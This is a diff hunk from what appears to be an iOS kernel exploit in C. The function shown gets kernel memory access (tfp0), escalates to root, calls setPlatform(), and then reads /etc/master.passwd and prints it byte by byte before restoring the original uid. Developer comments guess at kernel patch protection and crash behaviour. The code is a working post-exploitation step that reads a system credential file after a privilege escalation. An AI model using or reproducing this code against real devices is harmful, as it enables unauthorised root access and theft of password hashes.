@@ -694,13 +694,22 @@ void go() {
   mach_port_t tfp0 = get_kernel_memory_rw();
   printf("tfp0: %x\n", tfp0);
   uid_t olduid = get_root();
-    
+    //try cause some thrash (maybe this changes the watchtower_throttle value?)
+    setPlatform();
     //lets try something useful
-    int fd = open("/etc/master.passwd", O_RDONLY);
-    char buff [4096];
-    read(fd, buff,4096);
-    printf("Read /etc/master.passwd: %s\n",buff);
-       
-  reset_root(olduid);
+    printf("Read /etc/master.passwd\n");
+    FILE* fd = fopen("/etc/master.passwd", "r");
+    char ch;
+    
+    while( ( ch = fgetc(fd) ) != EOF )
+        printf("%c",ch);
+    fclose(fd);
+    printf("\n");
+    
+    //we  panic if we don't reset the uid - this is probably KPP kicking in?
+    reset_root(olduid);
+    
+    //interesting enough, if the app gets SIGKILL we don't seem to have a crash
+    //kill(getpid(), SIGKILL);
   return;
 }
